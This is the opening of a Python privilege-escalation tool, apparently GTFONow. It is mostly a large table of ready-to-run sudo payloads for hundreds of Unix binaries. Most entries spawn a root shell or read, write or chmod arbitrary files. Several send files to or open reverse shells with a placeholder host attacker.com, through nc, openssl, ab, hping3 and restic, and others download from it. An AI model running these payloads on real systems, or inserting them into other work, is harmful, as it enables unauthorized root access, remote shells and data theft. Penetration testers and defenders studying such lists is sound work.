#! /usr/bin/env/python
# -*- coding: utf-8 -*-
# https://github.com/Frissi0n/GTFONow
# Automatic privilege escalation for misconfiguRED capabilities, sudo and suid binaries.

from __future__ import print_function
import subprocess
import getpass
import os
import argparse
import sys
import re
import stat
import grp
import pwd
import logging
import platform
import time
import select

# SUDO_BINS_START
sudo_bins={
    "7z": [
        "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
    ],
    "aa-exec": [
        "sudo aa-exec /bin/sh"
    ],
    "ab": [
        "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
    ],
    "alpine": [
        "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
    ],
    "ansible-playbook": [
        "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
    ],
    "ansible-test": [
        "sudo ansible-test shell"
    ],
    "aoss": [
        "sudo aoss /bin/sh"
    ],
    "apt": [
        "sudo apt changelog apt\n!/bin/sh\n",
        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n",
        "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
    ],
    "apt-get": [
        "sudo apt-get changelog apt\n!/bin/sh\n",
        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
        "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
    ],
    "ar": [
        "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
    ],
    "aria2c": [
        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
    ],
    "arj": [
        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
    ],
    "arp": [
        "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
    ],
    "as": [
        "LFILE=file_to_read\nsudo as @$LFILE\n"
    ],
    "ascii-xfr": [
        "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
    ],
    "ascii85": [
        "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
    ],
    "ash": [
        "sudo ash"
    ],
    "aspell": [
        "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
    ],
    "at": [
        "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
    ],
    "atobm": [
        "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
    ],
    "awk": [
        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "aws": [
        "sudo aws help\n!/bin/sh\n"
    ],
    "base32": [
        "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
    ],
    "base58": [
        "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
    ],
    "base64": [
        "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
    ],
    "basenc": [
        "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
    ],
    "basez": [
        "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
    ],
    "bash": [
        "sudo bash"
    ],
    "batcat": [
        "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
    ],
    "bc": [
        "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
    ],
    "bconsole": [
        "sudo bconsole\n@exec /bin/sh\n"
    ],
    "bpftrace": [
        "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'",
        "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n",
        "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
    ],
    "bridge": [
        "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
    ],
    "bundle": [
        "sudo bundle help\n!/bin/sh\n"
    ],
    "bundler": [
        "sudo bundler help\n!/bin/sh\n"
    ],
    "busctl": [
        "sudo busctl --show-machine\n!/bin/sh\n"
    ],
    "busybox": [
        "sudo busybox sh"
    ],
    "byebug": [
        "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
    ],
    "bzip2": [
        "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
    ],
    "c89": [
        "sudo c89 -wrapper /bin/sh,-s ."
    ],
    "c99": [
        "sudo c99 -wrapper /bin/sh,-s ."
    ],
    "cabal": [
        "sudo cabal exec -- /bin/sh"
    ],
    "capsh": [
        "sudo capsh --"
    ],
    "cat": [
        "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
    ],
    "cdist": [
        "sudo cdist shell -s /bin/sh"
    ],
    "certbot": [
        "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
    ],
    "check_by_ssh": [
        "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
    ],
    "check_cups": [
        "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
    ],
    "check_log": [
        "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
    ],
    "check_memory": [
        "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
    ],
    "check_raid": [
        "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
    ],
    "check_ssl_cert": [
        "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"
    ],
    "check_statusfile": [
        "LFILE=file_to_read\nsudo check_statusfile $LFILE\n"
    ],
    "chmod": [
        "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n"
    ],
    "choom": [
        "sudo choom -n 0 /bin/sh"
    ],
    "chown": [
        "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
    ],
    "chroot": [
        "sudo chroot /\n"
    ],
    "clamscan": [
        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
    ],
    "cmp": [
        "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
    ],
    "cobc": [
        "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n"
    ],
    "column": [
        "LFILE=file_to_read\nsudo column $LFILE\n"
    ],
    "comm": [
        "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n"
    ],
    "composer": [
        "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
    ],
    "cowsay": [
        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n"
    ],
    "cowthink": [
        "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n"
    ],
    "cp": [
        "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
        "sudo cp /bin/sh /bin/cp\nsudo cp\n"
    ],
    "cpan": [
        "sudo cpan\n! exec '/bin/bash'\n"
    ],
    "cpio": [
        "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n",
        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n"
    ],
    "cpulimit": [
        "sudo cpulimit -l 100 -f /bin/sh"
    ],
    "crash": [
        "sudo crash -h\n!sh\n"
    ],
    "crontab": [
        "sudo crontab -e"
    ],
    "csh": [
        "sudo csh"
    ],
    "csplit": [
        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
    ],
    "csvtool": [
        "sudo csvtool call '/bin/sh;false' /etc/passwd"
    ],
    "cupsfilter": [
        "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
    ],
    "curl": [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n"
    ],
    "cut": [
        "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
    ],
    "dash": [
        "sudo dash"
    ],
    "date": [
        "LFILE=file_to_read\nsudo date -f $LFILE\n"
    ],
    "dc": [
        "sudo dc -e '!/bin/sh'"
    ],
    "dd": [
        "LFILE=file_to_write\necho \"data\" | sudo dd of=$LFILE\n"
    ],
    "debugfs": [
        "sudo debugfs\n!/bin/sh\n"
    ],
    "dialog": [
        "LFILE=file_to_read\nsudo dialog --textbox \"$LFILE\" 0 0\n"
    ],
    "diff": [
        "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n"
    ],
    "dig": [
        "LFILE=file_to_read\nsudo dig -f $LFILE\n"
    ],
    "distcc": [
        "sudo distcc /bin/sh"
    ],
    "dmesg": [
        "sudo dmesg -H\n!/bin/sh\n"
    ],
    "dmidecode": [
        "LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"\n"
    ],
    "dmsetup": [
        "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n"
    ],
    "dnf": [
        "sudo dnf install -y x-1.0-1.noarch.rpm\n"
    ],
    "docker": [
        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    ],
    "dosbox": [
        "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n"
    ],
    "dotnet": [
        "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
    ],
    "dpkg": [
        "sudo dpkg -l\n!/bin/sh\n",
        "sudo dpkg -i x_1.0_all.deb"
    ],
    "dstat": [
        "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n"
    ],
    "dvips": [
        "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"
    ],
    "easy_install": [
        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo easy_install $TF\n"
    ],
    "eb": [
        "sudo eb logs\n!/bin/sh\n"
    ],
    "ed": [
        "sudo ed\n!/bin/sh\n"
    ],
    "efax": [
        "LFILE=file_to_read\nsudo efax -d \"$LFILE\"\n"
    ],
    "elvish": [
        "sudo elvish"
    ],
    "emacs": [
        "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
    ],
    "enscript": [
        "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
    ],
    "env": [
        "sudo env /bin/sh"
    ],
    "eqn": [
        "LFILE=file_to_read\nsudo eqn \"$LFILE\"\n"
    ],
    "espeak": [
        "LFILE=file_to_read\nsudo espeak -qXf \"$LFILE\"\n"
    ],
    "ex": [
        "sudo ex\n!/bin/sh\n"
    ],
    "exiftool": [
        "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
    ],
    "expand": [
        "LFILE=file_to_read\nsudo expand \"$LFILE\"\n"
    ],
    "expect": [
        "sudo expect -c 'spawn /bin/sh;interact'"
    ],
    "facter": [
        "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
    ],
    "file": [
        "LFILE=file_to_read\nsudo file -f $LFILE\n"
    ],
    "find": [
        "sudo find . -exec /bin/sh \\; -quit"
    ],
    "fish": [
        "sudo fish"
    ],
    "flock": [
        "sudo flock -u / /bin/sh"
    ],
    "fmt": [
        "LFILE=file_to_read\nsudo fmt -999 \"$LFILE\"\n"
    ],
    "fold": [
        "LFILE=file_to_read\nsudo fold -w99999999 \"$LFILE\"\n"
    ],
    "fping": [
        "LFILE=file_to_read\nsudo fping -f $LFILE\n"
    ],
    "ftp": [
        "sudo ftp\n!/bin/sh\n"
    ],
    "gawk": [
        "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "gcc": [
        "sudo gcc -wrapper /bin/sh,-s ."
    ],
    "gcloud": [
        "sudo gcloud help\n!/bin/sh\n"
    ],
    "gcore": [
        "sudo gcore $PID"
    ],
    "gdb": [
        "sudo gdb -nx -ex '!sh' -ex quit"
    ],
    "gem": [
        "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc"
    ],
    "genie": [
        "sudo genie -c '/bin/sh'"
    ],
    "genisoimage": [
        "LFILE=file_to_read\nsudo genisoimage -q -o - \"$LFILE\"\n"
    ],
    "ghc": [
        "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
    ],
    "ghci": [
        "sudo ghci\nSystem.Process.callCommand \"/bin/sh\"\n"
    ],
    "gimp": [
        "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
    ],
    "ginsh": [
        "sudo ginsh\n!/bin/sh\n"
    ],
    "git": [
        "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help",
        "sudo git -p help config\n!/bin/sh\n",
        "sudo git branch --help config\n!/bin/sh\n",
        "TF=$(mktemp -d)\ngit init \"$TF\"\necho 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\"\nmv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\"\nsudo git -C \"$TF\" commit --allow-empty -m x\n",
        "TF=$(mktemp -d)\nln -s /bin/sh \"$TF/git-x\"\nsudo git \"--exec-path=$TF\" x\n"
    ],
    "grc": [
        "sudo grc --pty /bin/sh"
    ],
    "grep": [
        "LFILE=file_to_read\nsudo grep '' $LFILE\n"
    ],
    "gtester": [
        "TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
    ],
    "gzip": [
        "LFILE=file_to_read\nsudo gzip -f $LFILE -t\n"
    ],
    "hd": [
        "LFILE=file_to_read\nsudo hd \"$LFILE\"\n"
    ],
    "head": [
        "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
    ],
    "hexdump": [
        "LFILE=file_to_read\nsudo hexdump -C \"$LFILE\"\n"
    ],
    "highlight": [
        "LFILE=file_to_read\nsudo highlight --no-doc --failsafe \"$LFILE\"\n"
    ],
    "hping3": [
        "sudo hping3\n/bin/sh\n",
        "RHOST=attacker.com\nLFILE=file_to_read\nsudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"\n"
    ],
    "iconv": [
        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
    ],
    "iftop": [
        "sudo iftop\n!/bin/sh\n"
    ],
    "install": [
        "LFILE=file_to_change\nTF=$(mktemp)\nsudo install -m 6777 $LFILE $TF\n"
    ],
    "ionice": [
        "sudo ionice /bin/sh"
    ],
    "ip": [
        "LFILE=file_to_read\nsudo ip -force -batch \"$LFILE\"\n",
        "sudo ip netns add foo\nsudo ip netns exec foo /bin/sh\nsudo ip netns delete foo\n",
        "sudo ip netns add foo\nsudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nsudo ip netns exec bar /bin/sh\nsudo ip netns delete foo\nsudo ip netns delete bar\n"
    ],
    "irb": [
        "sudo irb\nexec '/bin/bash'\n"
    ],
    "ispell": [
        "sudo ispell /etc/passwd\n!/bin/sh\n"
    ],
    "jjs": [
        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
    ],
    "joe": [
        "sudo joe\n^K!/bin/sh\n"
    ],
    "join": [
        "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
    ],
    "journalctl": [
        "sudo journalctl\n!/bin/sh\n"
    ],
    "jq": [
        "LFILE=file_to_read\nsudo jq -Rr . \"$LFILE\"\n"
    ],
    "jrunscript": [
        "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
    ],
    "jtag": [
        "sudo jtag --interactive\nshell /bin/sh\n"
    ],
    "julia": [
        "sudo julia -e 'run(`/bin/sh`)'\n"
    ],
    "knife": [
        "sudo knife exec -E 'exec \"/bin/sh\"'\n"
    ],
    "ksh": [
        "sudo ksh"
    ],
    "ksshell": [
        "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
    ],
    "ksu": [
        "sudo ksu -q -e /bin/sh"
    ],
    "kubectl": [
        "LFILE=dir_to_serve\nsudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
    ],
    "latex": [
        "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
        "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    ],
    "latexmk": [
        "sudo latexmk -e 'exec \"/bin/sh\";'"
    ],
    "ld.so": [
        "sudo /lib/ld.so /bin/sh"
    ],
    "ldconfig": [
        "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
    ],
    "less": [
        "sudo less /etc/profile\n!/bin/sh\n"
    ],
    "lftp": [
        "sudo lftp -c '!/bin/sh'"
    ],
    "ln": [
        "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
    ],
    "loginctl": [
        "sudo loginctl user-status\n!/bin/sh\n"
    ],
    "logsave": [
        "sudo logsave /dev/null /bin/sh -i"
    ],
    "look": [
        "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
    ],
    "ltrace": [
        "sudo ltrace -b -L /bin/sh"
    ],
    "lua": [
        "sudo lua -e 'os.execute(\"/bin/sh\")'"
    ],
    "lualatex": [
        "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
    ],
    "luatex": [
        "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
    ],
    "lwp-download": [
        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
    ],
    "lwp-request": [
        "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
    ],
    "mail": [
        "sudo mail --exec='!/bin/sh'"
    ],
    "make": [
        "COMMAND='/bin/sh'\nsudo make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
    ],
    "man": [
        "sudo man man\n!/bin/sh\n"
    ],
    "mawk": [
        "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "minicom": [
        "sudo minicom -D /dev/null\n"
    ],
    "more": [
        "TERM= sudo more /etc/profile\n!/bin/sh\n"
    ],
    "mosquitto": [
        "LFILE=file_to_read\nsudo mosquitto -c \"$LFILE\"\n"
    ],
    "mount": [
        "sudo mount -o bind /bin/sh /bin/mount\nsudo mount\n"
    ],
    "msfconsole": [
        "sudo msfconsole\nmsf6 > irb\n>> system(\"/bin/sh\")\n"
    ],
    "msgattrib": [
        "LFILE=file_to_read\nsudo msgattrib -P $LFILE\n"
    ],
    "msgcat": [
        "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
    ],
    "msgconv": [
        "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
    ],
    "msgfilter": [
        "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'\n"
    ],
    "msgmerge": [
        "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
    ],
    "msguniq": [
        "LFILE=file_to_read\nsudo msguniq -P $LFILE\n"
    ],
    "mtr": [
        "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
    ],
    "multitime": [
        "sudo multitime /bin/sh"
    ],
    "mv": [
        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
    ],
    "mysql": [
        "sudo mysql -e '\\! /bin/sh'"
    ],
    "nano": [
        "sudo nano\n^R^X\nreset; sh 1>&0 2>&0\n"
    ],
    "nasm": [
        "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
    ],
    "nawk": [
        "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
    ],
    "nc": [
        "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
    ],
    "ncftp": [
        "sudo ncftp\n!/bin/sh\n"
    ],
    "neofetch": [
        "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
    ],
    "nft": [
        "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
    ],
    "nice": [
        "sudo nice /bin/sh"
    ],
    "nl": [
        "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE\n"
    ],
    "nm": [
        "LFILE=file_to_read\nsudo nm @$LFILE\n"
    ],
    "nmap": [
        "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
        "sudo nmap --interactive\nnmap> !sh\n"
    ],
    "node": [
        "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
    ],
    "nohup": [
        "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
    ],
    "npm": [
        "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
    ],
    "nroff": [
        "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
    ],
    "nsenter": [
        "sudo nsenter /bin/sh"
    ],
    "octave": [
        "sudo octave-cli --eval 'system(\"/bin/sh\")'"
    ],
    "od": [
        "LFILE=file_to_read\nsudo od -An -c -w9999 \"$LFILE\"\n"
    ],
    "openssl": [
        "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"
    ],
    "openvpn": [
        "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
        "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
    ],
    "openvt": [
        "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
    ],
    "opkg": [
        "sudo opkg install x_1.0_all.deb\n"
    ],
    "pandoc": [
        "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
    ],
    "paste": [
        "LFILE=file_to_read\nsudo paste $LFILE\n"
    ],
    "pdb": [
        "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
    ],
    "pdflatex": [
        "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
        "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
    ],
    "pdftex": [
        "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
    ],
    "perf": [
        "sudo perf stat /bin/sh\n"
    ],
    "perl": [
        "sudo perl -e 'exec \"/bin/sh\";'"
    ],
    "perlbug": [
        "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
    ],
    "pexec": [
        "sudo pexec /bin/sh"
    ],
    "pg": [
        "sudo pg /etc/profile\n!/bin/sh\n"
    ],
    "php": [
        "CMD=\"/bin/sh\"\nsudo php -r \"system('$CMD');\"\n"
    ],
    "pic": [
        "sudo pic -U\n.PS\nsh X sh X\n"
    ],
    "pico": [
        "sudo pico\n^R^X\nreset; sh 1>&0 2>&0\n"
    ],
    "pidstat": [
        "COMMAND=id\nsudo pidstat -e $COMMAND\n"
    ],
    "pip": [
        "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\nsudo pip install $TF\n"
    ],
    "pkexec": [
        "sudo pkexec /bin/sh"
    ],
    "pkg": [
        "sudo pkg install -y --no-repo-update ./x-1.0.txz\n"
    ],
    "posh": [
        "sudo posh"
    ],
    "pr": [
        "LFILE=file_to_read\npr -T $LFILE\n"
    ],
    "pry": [
        "sudo pry\nsystem(\"/bin/sh\")\n"
    ],
    "psftp": [
        "sudo psftp\n!/bin/sh\n"
    ],
    "psql": [
        "psql\n\\?\n!/bin/sh\n"
    ],
    "ptx": [
        "LFILE=file_to_read\nsudo ptx -w 5000 \"$LFILE\"\n"
    ],
    "puppet": [
        "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\"\n"
    ],
    "pwsh": [
        "sudo pwsh"
    ],
    "python": [
        "sudo python -c 'import os; os.system(\"/bin/sh\")'"
    ],
    "rake": [
        "sudo rake -p '`/bin/sh 1>&0`'"
    ],
    "rc": [
        "sudo rc -c '/bin/sh'"
    ],
    "readelf": [
        "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
    ],
    "red": [
        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
    ],
    "redcarpet": [
        "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
    ],
    "restic": [
        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\nsudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
    ],
    "rev": [
        "LFILE=file_to_read\nsudo rev $LFILE | rev\n"
    ],
    "rlwrap": [
        "sudo rlwrap /bin/sh"
    ],
    "rpm": [
        "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'",
        "sudo rpm -ivh x-1.0-1.noarch.rpm\n"
    ],
    "rpmdb": [
        "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
    ],
    "rpmquery": [
        "sudo rpmquery --eval '%{lua:posix.exec(\"/bin/sh\")}'"
    ],
    "rpmverify": [
        "sudo rpmverify --eval '%(/bin/sh 1>&2)'"
    ],
    "rsync": [
        "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
    ],
    "ruby": [
        "sudo ruby -e 'exec \"/bin/sh\"'"
    ],
    "run-mailcap": [
        "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
    ],
    "run-parts": [
        "sudo run-parts --new-session --regex '^sh$' /bin"
    ],
    "runscript": [
        "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
    ],
    "rview": [
        "sudo rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo rview -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "rvim": [
        "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
        "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
    ],
    "sash": [
        "sudo sash"
    ],
    "scanmem": [
        "sudo scanmem\nshell /bin/sh\n"
    ],
    "scp": [
        "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
    ],
    "screen": [
        "sudo screen"
    ],
    "script": [
        "sudo script -q /dev/null"
    ],
    "scrot": [
        "sudo scrot -e /bin/sh"
    ],
    "sed": [
        "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
    ],
    "service": [
        "sudo service ../../bin/sh"
    ],
    "setarch": [
        "sudo setarch $(arch) /bin/sh"
    ],
    "setfacl": [
        "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
    ],
    "setlock": [
        "sudo setlock - /bin/sh"
    ],
    "sftp": [
        "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
    ],
    "sg": [
        "sudo sg root\n"
    ],
    "shuf": [
        "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
    ],
    "slsh": [
        "sudo slsh -e 'system(\"/bin/sh\")'"
    ],
    "smbclient": [
